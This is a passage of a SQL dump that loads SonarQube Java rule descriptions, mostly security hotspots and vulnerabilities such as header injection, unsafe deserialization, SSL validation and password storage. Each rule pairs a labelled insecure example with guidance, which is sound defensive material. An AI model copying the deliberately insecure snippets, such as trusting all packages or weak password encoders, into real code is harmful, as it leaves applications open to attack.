<p>Email fields such as <code>subject</code>, <code>to</code>, <code>cc</code>, <code>bcc</code>, <code>from</code> are set in email "headers".&nbsp;
Using unvalidated user input to set those fields&nbsp;might allow attackers to inject new line characters in headers to craft malformed SMTP requests.
Although modern libraries are filtering new line character by default, user data used in&nbsp;email "headers" should always be validated.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9801">CVE-2017-9801</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4803">CVE-2016-4803</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Unvalidated user input are used to set email headers. </li>
  <li> Email content contains data provided by users and it is not sanitized. </li>
  <li> Email recipient list or body are based user inputs. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use an email library which sanitizes headers (java.mail &gt;= 1.5.6). </li>
  <li> Use html escape functions to sanitize every piece of data used to in the email body. </li>
  <li> Verify application logic to make sure that email base feature can not be abuse to:
    <ul>
      <li> Send arbitrary email for spamming or fishing </li>
      <li> Disclose sensitive email content </li>
    </ul> </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
import javax.mail.*;
import javax.mail.internet.MimeMessage;

public class Main {
    public static void sendEmail (Session session, String subject) throws MessagingException{
        Message message = new MimeMessage(session);  // Sensitive

        // For example the setSubject method is vulnerable to Header injection before
        // version 1.5.6 of javamail
        message.setSubject(subject);
        // ...
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.damonkohler.com/2008/12/email-injection.html">Email Injection</a> </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/93.html">MITRE, CWE-93</a> - Improper Neutralization of CRLF Sequences (''CRLF Injection'') </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/80.html">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page
  (Basic XSS) </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5301', '"ActiveMQConnectionFactory" should not be vulnerable to malicious code deserialization', 'sonarqube', 'Vulnerability', '<p>ActiveMQ can send/receive JMS Object messages (named ObjectMessage in ActiveMQ context) to comply with JMS specification. Internally, ActiveMQ
relies on Java serialization mechanism for marshaling/unmashaling of the message payload. Deserialization based on data supplied by the user could
lead to remote code execution attacks, where the structure of the serialized data is changed to modify the behavior of the object being
unserialized.</p>
<p>To limit the risk to be victim of such attack, ActiveMQ 5.12.2+ enforces developers to explicitly whitelist packages that can be exchanged using
ObjectMessages.</p>
<h2>Noncompliant Code Example</h2>
<pre>
ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://localhost:61616");
factory.setTrustAllPackages(true); // Noncompliant

ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://localhost:61616");
// no call to factory.setTrustedPackages(...);
</pre>
<h2>Compliant Solution</h2>
<pre>
ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://localhost:61616");
factory.setTrustedPackages(Arrays.asList("org.mypackage1", "org.mypackage2"));
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/502.html">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>
  <li> <a href="https://activemq.apache.org/objectmessage.html">ActiveMQ ObjectMessage Security Advisory</a> </li>
  <li> <a href="https://activemq.apache.org/security-advisories.data/CVE-2015-5254-announcement.txt">CVE-2015-5254</a> </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5304', 'Using environment variables is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Using environment variables is security-sensitive. For example, their use has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278">CVE-2014-6278</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3464">CVE-2019-3464</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000402">CVE-2018-1000402</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10530">CVE-2016-10530</a> </li>
</ul>
<p>Environment variables are sensitive to injection attacks, just like any other input.</p>
<p>Note also that environment variables can be exposed in multiple ways, storing sensitive information in them should be done carefully:</p>
<ul>
  <li> on Unix systems environment variables of one process can be read by another process running with the same UID. </li>
  <li> environment variables <a href="https://docs.oracle.com/javase/tutorial/essential/environment/env.html">might be forwarded to child
  processes</a>. </li>
  <li> application running in debug mode often exposes their environment variable. </li>
</ul>
<p>This rule raises an issue when environment variables are read.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Environment variables are used without being sanitized. </li>
  <li> You store sensitive information in environment variables and other processes might be able to access them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize every environment variable before using its value.</p>
<p>If you store sensitive information in an environment variable, make sure that no other process can access them, i.e. the process runs with a
separate user account and child processes don''t have access to their parent''s environment.</p>
<p>Don''t run your application in debug mode if it has access to sensitive information, including environment variables.</p>
<h2>Sensitive Code Example</h2>
<pre>
public class Main {
    public static void main (String[] args) {
        System.getenv();  // Sensitive
        System.getenv("myvar");  // Sensitive

        ProcessBuilder processBuilder = new ProcessBuilder();
        Map&lt;String, String&gt; environment = processBuilder.environment();  // Sensitive
        environment.put("VAR", "value");

        Runtime.getRuntime().exec("ping", new String[]{"env=val"});   // Sensitive
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/526.html">MITRE, CWE-526</a> - Information Exposure Through Environmental Variables </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/74.html">MITRE, CWE-74</a> - Improper Neutralization of Special Elements in Output Used by a
  Downstream Component (''Injection'') </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5320', 'Broadcasting intents is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>In Android applications, broadcasting intents is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9489">CVE-2018-9489</a> </li>
</ul>
<p>By default, broadcasted intents are visible to every application, exposing all sensitive information they contain.</p>
<p>This rule raises an issue when an intent is broadcasted without specifying any "receiver permission".</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The intent contains sensitive information. </li>
  <li> Intent reception is not restricted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See <a
href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.UserHandle;
import android.support.annotation.RequiresApi;

public class MyIntentBroadcast {
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)
    public void broadcast(Intent intent, Context context, UserHandle user,
                          BroadcastReceiver resultReceiver, Handler scheduler, int initialCode,
                          String initialData, Bundle initialExtras,
                          String broadcastPermission) {
        context.sendBroadcast(intent); // Sensitive
        context.sendBroadcastAsUser(intent, user); // Sensitive

        // Broadcasting intent with "null" for receiverPermission
        context.sendBroadcast(intent, null); // Sensitive
        context.sendBroadcastAsUser(intent, user, null); // Sensitive
        context.sendOrderedBroadcast(intent, null); // Sensitive
        context.sendOrderedBroadcastAsUser(intent, user, null, resultReceiver,
                scheduler, initialCode, initialData, initialExtras); // Sensitive

        context.sendBroadcast(intent, broadcastPermission); // Ok
        context.sendBroadcastAsUser(intent, user, broadcastPermission); // Ok
        context.sendOrderedBroadcast(intent, broadcastPermission); // Ok
        context.sendOrderedBroadcastAsUser(intent, user,broadcastPermission, resultReceiver,
                scheduler, initialCode, initialData, initialExtras); // Ok
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/927.html">MITRE, CWE-927</a> - Use of Implicit Intent for Sensitive Communication </li>
  <li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5322', 'Receiving intents is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>In Android applications, receiving intents is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1677">CVE-2019-1677</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1275">CVE-2015-1275</a> </li>
</ul>
<p>Once a receiver is registered, any app can broadcast potentially malicious intents to your application.</p>
<p>This rule raises an issue when a receiver is registered without specifying any "broadcast permission".</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The data extracted from intents is not sanitized. </li>
  <li> Intents broadcast is not restricted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See <a
href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.support.annotation.RequiresApi;

public class MyIntentReceiver {

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void register(Context context, BroadcastReceiver receiver,
                         IntentFilter filter,
                         String broadcastPermission,
                         Handler scheduler,
                         int flags) {
        context.registerReceiver(receiver, filter); // Sensitive
        context.registerReceiver(receiver, filter, flags); // Sensitive

        // Broadcasting intent with "null" for broadcastPermission
        context.registerReceiver(receiver, filter, null, scheduler); // Sensitive
        context.registerReceiver(receiver, filter, null, scheduler, flags); // Sensitive


        context.registerReceiver(receiver, filter,broadcastPermission, scheduler); // OK
        context.registerReceiver(receiver, filter,broadcastPermission, scheduler, flags); // OK
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/925.html">MITRE, CWE-925</a> - Improper Verification of Intent by Broadcast Receiver </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat1">SANS Top 25</a> - Insecure Interaction Between Components </li>
  <li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5324', 'Accessing Android external storage is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>In Android applications, accessing external storage is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15004">CVE-2018-15004</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15002">CVE-2018-15002</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-14995">CVE-2018-14995</a> </li>
</ul>
<p>Any application having the permissions <code>WRITE_EXTERNAL_STORAGE</code> or <code>READ_EXTERNAL_STORAGE</code> can access files stored on an
external storage, be it a private or a public file.</p>
<p>This rule raises an issue when the following functions are called:</p>
<ul>
  <li> <code>android.os.Environment.getExternalStorageDirectory</code> </li>
  <li> <code>android.os.Environment.getExternalStoragePublicDirectory</code> </li>
  <li> <code>android.content.Context.getExternalFilesDir</code> </li>
  <li> <code>android.content.Context.getExternalFilesDirs</code> </li>
  <li> <code>android.content.Context.getExternalMediaDirs</code> </li>
  <li> <code>android.content.Context.getExternalCacheDir</code> </li>
  <li> <code>android.content.Context.getExternalCacheDirs</code> </li>
  <li> <code>android.content.Context.getObbDir</code> </li>
  <li> <code>android.content.Context.getObbDirs</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Data written to the external storage is security-sensitive and is not encrypted. </li>
  <li> Data read from files is not validated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Validate any data read from files.</p>
<p>Avoid writing sensitive information to an external storage. If this is required, make sure that the data is encrypted properly.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.Context;
import android.os.Environment;

public class AccessExternalFiles {

    public void accessFiles(Context context) {
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES); // Sensitive
        context.getExternalFilesDir(Environment.DIRECTORY_PICTURES); // Sensitive
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://developer.android.com/training/articles/security-tips#ExternalStorage">Android Security tips on external file storage</a>
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/312.html">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/20.html">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat2">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5326', 'Validating SSL/TLS connections is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Validating SSL/TLS connections is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-5531">CVE-2014-5531</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-5524">CVE-2014-5524</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-5574">CVE-2014-5574</a> </li>
</ul>
<p>SSL/TLS protocols encrypt network connections. The server usually provides a digital certificate to prove its identity. Accepting all SSL/TLS
certificates makes your application vulnerable to <a href="https://www.owasp.org/index.php/Man-in-the-middle_attack">Man-in-the-middle attacks
(MITM)</a>.</p>
<p>This rule will raise an issue when a method named <code>onReceivedSslError</code> with first argument of type <code>android.webkit.WebView</code>
is defined.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> invalid SSL/TLS certificates are accepted automatically. </li>
  <li> The user is asked to accept invalid SSL/TLS certificates. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Accept only trusted SSL/TLS certificates. </li>
  <li> Do not ask users to accept unsafe connections as they are unlikely to make an informed security decision. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Android (See also <a href="https://support.google.com/faqs/answer/7071387?hl=en">"How to address WebView SSL Error Handler alerts in your
apps."</a>)</p>
<pre>
package com.example.myapplication.rspec_5326;

import android.net.http.SslError;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.webkit.SslErrorHandler;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.util.function.Function;

public class SSLTLSValidation extends WebViewClient {
    private final Function&lt;SslError, Boolean&gt; acceptSslError;

    SSLTLSValidation(Function&lt;SslError, Boolean&gt; acceptSslError) {
        this.acceptSslError = acceptSslError;
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    @Override
    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) { // Sensitive
        if (acceptSslError.apply(error)) {
            handler.proceed();
        } else {
            handler.cancel();
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/295.html">MITRE, CWE-295</a> - Improper Certificate Validation </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href=''/coding_rules#rule_key=java%3AS4423''>S4423</a>, <a href=''/coding_rules#rule_key=java%3AS4830''>S4830</a>, <a href=''/coding_rules#rule_key=java%3AS5527''>S5527</a> instead.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5332', 'Using clear-text protocols is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Clear-text protocols as <code>ftp</code>, <code>telnet</code> or non secure <code>http</code> are lacking encryption of transported data. They are
also missing the capability to build an authenticated connection. This mean that any attacker who can sniff traffic from the network can read, modify
or corrupt the transported content. These protocol are not secure as they expose applications to a large range of risk:</p>
<ul>
  <li> Sensitive data exposure </li>
  <li> Traffic redirected to a malicious endpoint </li>
  <li> Malware infected software update or installer </li>
  <li> Execution of client side code </li>
  <li> Corruption of critical information </li>
</ul>
<p>Note also that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browser</a>. </p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The confidentiality and integrity of data is necessary in the context of the web application. </li>
  <li> The data is exchanged on an exposed network (Internet, public network etc). </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use <code>ssh</code> as an alternative to <code>telnet</code> </li>
  <li> Use <code>sftp</code>, <code>scp</code> or <code>ftps</code> instead of <code>ftp</code> </li>
  <li> Use <code>https</code> instead of <code>http</code> </li>
  <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP </li>
</ul>
<p>It is recommended to secure all transport channels (event local network) as it can take a single non secure connection to compromise an entire
application or system. </p>
<h2>Sensitive Code Example</h2>
<p>These clients from <a href="https://commons.apache.org/proper/commons-net/">Apache commons net</a> libraries are based on unencrypted protocols and
are not recommended:</p>
<pre>
TelnetClient telnet = new TelnetClient(); // Sensitive

FTPClient ftpClient = new FTPClient(); // Sensitive

SMTPClient smtpClient = new SMTPClient(); // Sensitive
</pre>
<p>Unencrypted HTTP connections, when using <a href="https://square.github.io/okhttp/https/">okhttp</a> library for instance, should be avoided:</p>
<pre>
ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.CLEARTEXT) // Sensitive
  .build();
</pre>
<p> </p>
<h2>Compliant Solution</h2>
<p>Use instead these clients from <a href="https://commons.apache.org/proper/commons-net/">Apache commons net</a> and <a
href="http://www.jcraft.com/jsch/">JSch/ssh</a> library:</p>
<pre>
JSch jsch = new JSch(); // Compliant

if(implicit) {
  // implicit mode is considered deprecated but offer the same security than explicit mode
  FTPSClient ftpsClient = new FTPSClient(true); // Compliant
}
else {
  FTPSClient ftpsClient = new FTPSClient(); // Compliant
}

if(implicit) {
  // implicit mode is considered deprecated but offer the same security than explicit mode
  SMTPSClient smtpsClient = new SMTPSClient(true); // Compliant
}
else {
  SMTPSClient smtpsClient = new SMTPSClient(); // Compliant
  smtpsClient.connect("127.0.0.1", 25);
  if (smtpsClient.execTLS()) {
    // commands
  }
}
</pre>
<p>Perform HTTP encrypted connections, with <a href="https://square.github.io/okhttp/https/">okhttp</a> library for instance:</p>
<pre>
ConnectionSpec spec = new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS) // Compliant
  .build();
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code> </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/200.html">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/319">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5344', 'Passwords should not be stored in plain-text or with a fast hashing algorithm', 'sonarqube', 'Vulnerability', '<p>A user password should never be stored in clear-text, instead a hash should be produced from it using a secure algorithm:</p>
<ul>
  <li> not vulnerable to <code>brute force attacks</code>. </li>
  <li> not vulnerable to <code>collision attacks</code> (see rule s4790). </li>
  <li> and a salt should be added to the password to lower the risk of <code>rainbow table attacks</code> (see rule s2053). </li>
</ul>
<p>This rule raises an issue when a password is stored in clear-text or with a hash algorithm vulnerable to <code>bruce force attacks</code>. These
algorithms, like <code>md5</code> or <code>SHA-family</code> functions are fast to compute the hash and therefore brute force attacks are possible
(it''s easier to exhaust the entire space of all possible passwords) especially with hardware like GPU, FPGA or ASIC. Modern password hashing
algorithms such as <code>bcrypt</code>, <code>PBKDF2</code> or <code>argon2</code> are recommended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Autowired
public void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {
  auth.jdbcAuthentication()
    .dataSource(dataSource)
    .usersByUsernameQuery("SELECT * FROM users WHERE username = ?")
    .passwordEncoder(new StandardPasswordEncoder()); // Noncompliant

  // OR
  auth.jdbcAuthentication()
    .dataSource(dataSource)
    .usersByUsernameQuery("SELECT * FROM users WHERE username = ?"); // Noncompliant; default uses plain-text

  // OR
  auth.userDetailsService(...); // Noncompliant; default uses plain-text
  // OR
  auth.userDetailsService(...).passwordEncoder(new StandardPasswordEncoder()); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Autowired
public void configureGlobal(AuthenticationManagerBuilder auth, DataSource dataSource) throws Exception {
  auth.jdbcAuthentication()
    .dataSource(dataSource)
    .usersByUsernameQuery("Select * from users where username=?")
    .passwordEncoder(new BCryptPasswordEncoder());

  // or
  auth.userDetailsService(null).passwordEncoder(new BCryptPasswordEncoder());
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">OWASP CheatSheet</a> - Password Storage Cheat Sheet
  </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/328">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/916">MITRE, CWE-916</a> - Use of Password Hash With Insufficient Computational Effort </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5361', '"String#replace" should be preferred to "String#replaceAll"', 'sonarqube', 'Code Smell', '<p>The underlying implementation of <code>String::replaceAll</code> calls the <code>java.util.regex.Pattern.compile()</code> method each time it is
called even if the first argument is not a regular expression. This has a significant performance cost and therefore should be used with care.</p>
<p>When <code>String::replaceAll</code> is used, the first argument should be a real regular expression. If it’s not the case,
<code>String::replace</code> does exactly the same thing as <code>String::replaceAll</code> without the performance drawback of the regex.</p>
<p>This rule raises an issue for each <code>String::replaceAll</code> used with a <code>String</code> as first parameter which doesn’t contains
special regex character or pattern.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String init = "Bob is a Bird... Bob is a Plane... Bob is Superman!";
String changed = init.replaceAll("Bob is", "It''s"); // Noncompliant
changed = changed.replaceAll("\\.\\.\\.", ";"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
String init = "Bob is a Bird... Bob is a Plane... Bob is Superman!";
String changed = init.replace("Bob is", "It''s");
changed = changed.replace("...", ";");
</pre>
<p>Or, with a regex:</p>
<pre>
String init = "Bob is a Bird... Bob is a Plane... Bob is Superman!";
String changed = init.replaceAll("\\w*\\sis", "It''s");
changed = changed.replaceAll("\\.{3}", ";");
</pre>
<h2>See</h2>
<ul>
  <li> <a href=''/coding_rules#rule_key=java%3AS4248''>S4248</a> - Regex patterns should not be created needlessly </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5411', 'Boxed "Boolean" should be avoided in boolean expressions', 'sonarqube', 'Code Smell', '<p>When boxed type <code>java.lang.Boolean</code> is used as an expression it will throw <code>NullPointerException</code> if the value is
<code>null</code> as defined in <a href="https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8">Java Language Specification §5.1.8
Unboxing Conversion</a>.</p>
<p>It is safer to avoid such conversion altogether and handle the <code>null</code> value explicitly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Boolean b = getBoolean();
if (b) {  // Noncompliant, it will throw NPE when b == null
  foo();
} else {
  bar();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Boolean b = getBoolean();
if (Boolean.TRUE.equals(b)) {
  foo();
} else {
  bar();  // will be invoked for both b == false and b == null
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8">Java Language Specification §5.1.8 Unboxing Conversion</a>
  </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5413', '''List.remove()'' should not be used in ascending ''for'' loops', 'sonarqube', 'Code Smell', '<p>When <code>List.remove()</code> is called it will shrink the list. If this is done inside the ascending loop iterating through all elements it will
skip the element after the removed index.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void removeFrom(List&lt;String&gt; list) {
  // expected: iterate over all the elements of the list
  for (int i = 0; i &lt; list.size(); i++) {
    if (list.get(i).isEmpty()) {
      // actual: remaining elements are shifted, so the one immediately following will be skipped
      list.remove(i); // Noncompliant
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>You can either adjust the loop index to account for the change in the size of the list</p>
<pre>
static void removeFrom(List&lt;String&gt; list) {
    // expected: iterate over all the elements of the list
    for (int i = 0; i &lt; list.size(); i++) {
      if (list.get(i).isEmpty()) {
        // actual: remaining elements are shifted, so the one immediately following will be skipped
        list.remove(i);
        i--;
      }
    }
  }
</pre>
<p>Or preferably it''s probably better to rely on Java 8''s <code>removeIf</code> method</p>
<pre>
 static void removeFrom(List&lt;String&gt; list) {
    list.removeIf(String::isEmpty);
  }
</pre>
<p>&nbsp;</p>
<h2>Exceptions</h2>
<p>The descending loop doesn''t have this issue, because the index will be correct when we loop in descending order</p>
<pre>
void removeFrom(List&lt;String&gt; list) {
